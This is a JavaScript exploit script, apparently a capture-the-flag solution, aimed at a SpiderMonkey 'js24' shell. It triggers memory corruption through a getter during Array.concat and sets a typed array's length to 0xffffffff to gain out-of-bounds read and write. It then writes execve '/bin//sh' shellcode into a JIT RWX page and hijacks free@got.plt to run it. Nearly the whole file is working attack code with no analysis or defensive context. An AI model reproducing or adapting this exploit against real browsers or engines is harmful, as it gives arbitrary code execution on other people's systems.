function Int2Array(val) {
    var res = [];
    var hexed = ('0000000000000000' + val.toString(16)).substr(-16);
    for (var i = 0; i < 16; i+=2)
        res.push(parseInt(hexed.substring(i,i+2), 16));
    return res;
}

function toDouble(val) {
    var buffer = new ArrayBuffer(8);
    var byteView = new Uint8Array(buffer);
    var view = new Float64Array(buffer);

    byteView.set(Int2Array(val).reverse());
    return view[0];
};

function fromDouble(val) {
    var buffer = new ArrayBuffer(8);
    var view = new Float64Array(buffer);
    view[0] = val;
    return new Uint8Array(buffer, 0, view.BYTES_PER_ELEMENT);
};

function readmem(arg){
    res = "";
    bytes = fromDouble(arg);
    for (var i = 0; i < bytes.length; i++){
        res += ('0' + bytes[bytes.length - 1 - i].toString(16)).substr(-2);
    }
    return res;
}

function shellcode2array(sh){
    var res = []
    for (var i=0; i<sh.length; i+=4){
        num = 0
        for (var j=0; j<4; j++){
            if (!sh.charCodeAt(i+j))
                break;
            num += sh.charCodeAt(i+j)*Math.pow(0x100,j);
        }
        res.push(num);
    }
    return res;
}

a1=[0x41414141,0x42424242,0x43434343];
a1.__defineGetter__(0, function() {
  a1.length = 0x30000;
  a3 = new Uint32Array(0x1337);
});
a2=a1.concat(a1);

while(a3.length > 0){
    a3_len_idx = a2.indexOf(0x1337);
    a2[a3_len_idx] = 0xffffffff; // length to 0xffffffff
}

a3_buffer_idx = a3_len_idx+2;
print("[+] a3.length index: " + a3_len_idx);
a2[a3_buffer_idx] = 0x0; // a3's offset to 0x0

oob_read = function(idx){
    return 0x100000000*a3[idx/4+1] + a3[idx/4];
};
oob_write = function(idx, val){
    a3[idx/4] = val%0x100000000; 
    a3[idx/4+1] = val/0x100000000;
};

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";
shellcode_arr = shellcode2array(shellcode);

jit_idx = a2.indexOf(toDouble(0x000002670000026b)) - 1;
jit_addr = parseInt(readmem(a2[jit_idx]).substr(-8), 16);
print("[+] jit (rwx) address: 0x" + jit_addr.toString(16));

for(var i = 0; i < shellcode_arr.length; i++)
    oob_write(jit_addr+4*i, shellcode_arr[i]);

free_got = 0x08571160; // objdump -R ./js24 | grep free
print("[*] overwrite free@got.plt with shellcode address");
oob_write(free_got, jit_addr); // pwn!
